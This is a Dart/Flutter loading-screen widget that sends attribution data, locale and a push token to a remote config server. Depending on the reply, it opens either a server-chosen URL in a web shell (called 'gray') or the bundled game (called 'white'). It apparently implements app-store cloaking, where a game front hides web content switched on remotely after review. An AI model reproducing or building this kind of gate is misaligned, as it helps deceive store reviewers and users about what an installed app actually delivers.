import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:video_player/video_player.dart';

import '../../screens/main_menu_screen.dart';
import '../infra/alert_relay.dart';
import '../infra/connectivity_probe.dart';
import '../infra/core_dispatch.dart';
import '../infra/data_vault.dart';
import '../infra/install_signal.dart';
import '../infra/native_link_bridge.dart';
import '../models/launch_mode.dart';
import 'allow_screen.dart';
import 'offline_screen.dart';
import 'web_shell.dart';

enum _BarStep { empty, midway, done }

/// ★ Core gate loading screen.
///
/// Shows the existing loading splash video while running the attribution
/// + config pipeline, then routes to either WebShell (gray) or the
/// existing game's LoadingScreen (white).
///
/// Boot flow:
///   fresh  → network → AppsFlyer → POST config → web or game
///   web    → fast refresh → web (cached URL if server fails)
///   game   → re-attempt online → game
class LoadGate extends StatefulWidget {
  final DataVault vault;
  final ConnectivityProbe probe;
  final InstallSignal signal;
  final CoreDispatch dispatch;
  final AlertRelay alerts;

  const LoadGate({
    super.key,
    required this.vault,
    required this.probe,
    required this.signal,
    required this.dispatch,
    required this.alerts,
  });

  @override
  State<LoadGate> createState() => _LoadGateState();
}

class _LoadGateState extends State<LoadGate> {
  VideoPlayerController? _vid;
  bool _vidReady = false;
  _BarStep _bar = _BarStep.empty;
  bool _navigated = false;
  Orientation? _lastOrientation;

  @override
  void initState() {
    super.initState();
    SystemChrome.setPreferredOrientations(const [
      DeviceOrientation.portraitUp, DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft, DeviceOrientation.landscapeRight,
    ]);
    _boot();
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    final o = MediaQuery.of(context).orientation;
    if (o != _lastOrientation) { _lastOrientation = o; _switchVideo(o); }
  }

  Future<void> _switchVideo(Orientation o) async {
    final asset = o == Orientation.landscape
        ? 'assets/additional_assets/loading_screen/16x9_loading_screen.mp4'
        : 'assets/additional_assets/loading_screen/9x16_Loading_Screen.mp4';
    final old = _vid;
    final ctrl = VideoPlayerController.asset(asset);
    try {
      await ctrl.initialize();
      ctrl.setLooping(true);
      ctrl.setVolume(0);
      ctrl.play();
      if (!mounted) { ctrl.dispose(); return; }
      setState(() { _vid = ctrl; _vidReady = true; });
      old?.dispose();
    } catch (_) {
      ctrl.dispose();
    }
  }

  void _setBar(_BarStep s) { if (mounted) setState(() => _bar = s); }

  Future<void> _boot() async {
    widget.alerts.onTokenRefresh = _onTokenRefresh;

    // ── STEP 1: SceneDelegate cold-start URL (highest priority) ──────
    final nativeColdUrl = await NativeLinkBridge.consumeColdUrl();
    if (nativeColdUrl != null && nativeColdUrl.isNotEmpty) {
      debugPrint('[TB.LG] native cold-start url → $nativeColdUrl');
      await widget.vault.writeMode(LaunchMode.web);
      await widget.vault.consumeOneShotUrl();
      SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
      await WidgetsBinding.instance.endOfFrame;
      await Future.delayed(const Duration(milliseconds: 150));
      unawaited(_dispatchBackground());
      _goContent(nativeColdUrl);
      return;
    }

    _setBar(_BarStep.empty);
    final mode = widget.vault.readMode();

    switch (mode) {
      case LaunchMode.web:
        _setBar(_BarStep.midway);
        unawaited(widget.alerts.bootstrap().catchError((_) {}));
        unawaited(widget.signal.warmup().catchError((_) {}));
        await _handleWebMode();
        break;
      case LaunchMode.game:
        _setBar(_BarStep.midway);
        unawaited(widget.alerts.bootstrap().catchError((_) {}));
        unawaited(widget.signal.warmup().catchError((_) {}));
        final recovered = await _tryRecoverWebMode(
          conversionTimeout: const Duration(seconds: 2),
          deepLinkTimeout: const Duration(seconds: 2),
        ).timeout(const Duration(seconds: 3), onTimeout: () => false);
        if (recovered) return;
        _setBar(_BarStep.done);
        await Future.delayed(const Duration(milliseconds: 200));
        _goGame();
        break;
      case LaunchMode.fresh:
        await Future.wait([
          widget.alerts.bootstrap().catchError((_) {}),
          widget.signal.warmup().catchError((_) {}),
        ]);
        await _handleFreshMode();
        break;
    }
  }

  @override
  void dispose() {
    widget.alerts.onTokenRefresh = null;
    _vid?.dispose();
    super.dispose();
  }

  void _onTokenRefresh(String token) async {
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(locale: locale, pushToken: token);
    widget.dispatch.send(body);
  }

  Future<void> _handleFreshMode() async {
    _setBar(_BarStep.empty);
    final online = await widget.probe.isOnline();
    if (!online) { if (mounted) _goOffline(fresh: true); return; }

    _setBar(_BarStep.midway);
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 5)),
      widget.signal.awaitDeepLink(timeout: const Duration(seconds: 3)),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(
      locale: locale, pushToken: widget.alerts.token,
    );
    final reply = await widget.dispatch.send(body);

    if (reply.granted && reply.destination != null) {
      await widget.vault.writeMode(LaunchMode.web);
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 200));
      if (!mounted) return;
      _goContent(reply.destination!);
    } else {
      await widget.vault.writeMode(LaunchMode.game);
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 200));
      if (!mounted) return;
      _goGame();
    }
  }

  Future<void> _handleWebMode() async {
    final online = await widget.probe.isOnline();

    if (!online) {
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 200));
      if (mounted) _goOffline(fresh: false);
      return;
    }

    final oneShotUrl = await widget.vault.consumeOneShotUrl();
    if (oneShotUrl != null) {
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 200));
      if (mounted) _goContent(oneShotUrl);
      return;
    }

    final savedUrl = await widget.vault.readSavedUrl();
    if (savedUrl != null) {
      unawaited(_refreshWebInBackground());
      _setBar(_BarStep.done);
      await Future.delayed(const Duration(milliseconds: 200));
      if (mounted) _goContent(savedUrl);
      return;
    }

    await widget.signal.warmup();
    await Future.wait([
      widget.signal.awaitConversion(timeout: const Duration(seconds: 4)),
      widget.signal.awaitDeepLink(timeout: const Duration(seconds: 2)),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(
      locale: locale, pushToken: widget.alerts.token,
    );
    final reply = await widget.dispatch.send(body);

    _setBar(_BarStep.done);
    await Future.delayed(const Duration(milliseconds: 200));
    if (!mounted) return;

    if (reply.granted && reply.destination != null) {
      _goContent(reply.destination!);
      return;
    }
    _goOffline(fresh: false);
  }

  Future<void> _refreshWebInBackground() async {
    try {
      await widget.signal.warmup();
      await Future.wait([
        widget.signal.awaitConversion(timeout: const Duration(seconds: 3)),
        widget.signal.awaitDeepLink(timeout: const Duration(seconds: 2)),
      ]);
      final body = await widget.signal.buildPayload(
        locale: Platform.localeName.replaceAll('-', '_'),
        pushToken: widget.alerts.token,
      );
      await widget.dispatch.send(body);
    } catch (e) {
      debugPrint('[TB.LG] background refresh error: $e');
    }
  }

  Future<bool> _tryRecoverWebMode({
    Duration conversionTimeout = const Duration(seconds: 3),
    Duration deepLinkTimeout = const Duration(seconds: 2),
  }) async {
    final online = await widget.probe.isOnline();
    if (!online) return false;
    await widget.signal.warmup();
    await Future.wait([
      widget.signal.awaitConversion(timeout: conversionTimeout),
      widget.signal.awaitDeepLink(timeout: deepLinkTimeout),
    ]);
    final locale = Platform.localeName.replaceAll('-', '_');
    final body = await widget.signal.buildPayload(
      locale: locale, pushToken: widget.alerts.token,
    );
    final reply = await widget.dispatch.send(body);
    if (!(reply.granted && reply.destination != null)) return false;
    await widget.vault.writeMode(LaunchMode.web);
    _setBar(_BarStep.done);
    await Future.delayed(const Duration(milliseconds: 200));
    if (!mounted) return true;
    _goContent(reply.destination!);
    return true;
  }

  Future<void> _dispatchBackground() async {
    try {
      await Future.wait([
        widget.alerts.bootstrap().catchError((_) {}),
        widget.signal.warmup().catchError((_) {}),
      ]);
      await Future.wait([
        widget.signal.awaitConversion(timeout: const Duration(seconds: 4)),
        widget.signal.awaitDeepLink(timeout: const Duration(seconds: 2)),
      ]);
      final body = await widget.signal.buildPayload(
        locale: Platform.localeName.replaceAll('-', '_'),
        pushToken: widget.alerts.token,
      );
      await widget.dispatch.send(body);
    } catch (e) {
      debugPrint('[TB.LG] background dispatch error: $e');
    }
  }

  void _goContent(String url, {bool? layoutSettle}) {
    final settle = layoutSettle ?? Platform.isIOS;
    if (_navigated) return;
    _navigated = true;
    if (widget.vault.needsPushPrompt()) {
      widget.alerts.shouldOfferConsent().then((canAsk) {
        if (!mounted) return;
        if (canAsk) {
          Navigator.of(context).pushReplacement(MaterialPageRoute(
            builder: (_) => AllowScreen(
              vault: widget.vault,
              alerts: widget.alerts,
              probe: widget.probe,
              signal: widget.signal,
              dispatch: widget.dispatch,
              destination: url,
              layoutSettle: settle,
            ),
          ));
        } else {
          _directShell(url, layoutSettle: settle);
        }
      });
    } else {
      _directShell(url, layoutSettle: settle);
    }
  }

  void _directShell(String url, {bool layoutSettle = false}) {
    if (!mounted) return;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => WebShell(
        destination: url,
        vault: widget.vault,
        alerts: widget.alerts,
        probe: widget.probe,
        layoutSettle: layoutSettle,
      ),
    ));
  }

  /// Navigate to the white game. LoadGate already serves as the loading
  /// experience — go straight to the main menu to avoid a double splash.
  void _goGame() {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute(builder: (_) => const MainMenuScreen()),
    );
  }

  void _goOffline({required bool fresh}) {
    if (_navigated) return;
    _navigated = true;
    Navigator.of(context).pushReplacement(MaterialPageRoute(
      builder: (_) => OfflineScreen(
        probe: widget.probe,
        retryBuilder: (_) => LoadGate(
          vault: widget.vault,
          probe: widget.probe,
          signal: widget.signal,
          dispatch: widget.dispatch,
          alerts: widget.alerts,
        ),
      ),
    ));
  }

  String _barAsset() {
    switch (_bar) {
      case _BarStep.empty:  return 'assets/additional_assets/loading_screen/loading_bar_01.webp';
      case _BarStep.midway: return 'assets/additional_assets/loading_screen/loading_bar_02.webp';
      case _BarStep.done:   return 'assets/additional_assets/loading_screen/loading_bar_04.webp';
    }
  }

  @override
  Widget build(BuildContext context) {
    final barAsset = _barAsset();
    final mq = MediaQuery.of(context);
    final landscape = mq.orientation == Orientation.landscape;
    final barW = landscape
        ? (mq.size.height * 0.35).clamp(0.0, 160.0)
        : (mq.size.width * 0.70).clamp(0.0, 340.0);

    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        fit: StackFit.expand,
        children: [
          const ColoredBox(color: Colors.black),
          AnimatedOpacity(
            opacity: _vidReady ? 1.0 : 0.0,
            duration: const Duration(milliseconds: 400),
            child: _vid != null && _vidReady
                ? SizedBox.expand(
                    child: FittedBox(
                      fit: BoxFit.cover,
                      child: SizedBox(
                        width: _vid!.value.size.width,
                        height: _vid!.value.size.height,
                        child: VideoPlayer(_vid!),
                      ),
                    ),
                  )
                : const SizedBox.shrink(),
          ),
          if (_vidReady)
            Positioned(
              left: 0, right: 0,
              bottom: landscape ? 0 : mq.padding.bottom,
              child: Center(
                child: AnimatedSwitcher(
                  duration: const Duration(milliseconds: 300),
                  child: Image.asset(
                    barAsset,
                    key: ValueKey(barAsset),
                    width: barW,
                    fit: BoxFit.contain,
                    gaplessPlayback: true,
                    errorBuilder: (ctx, e, st) => const SizedBox(height: 32),
                  ),
                ),
              ),
            ),
        ],
      ),
    );
  }
}
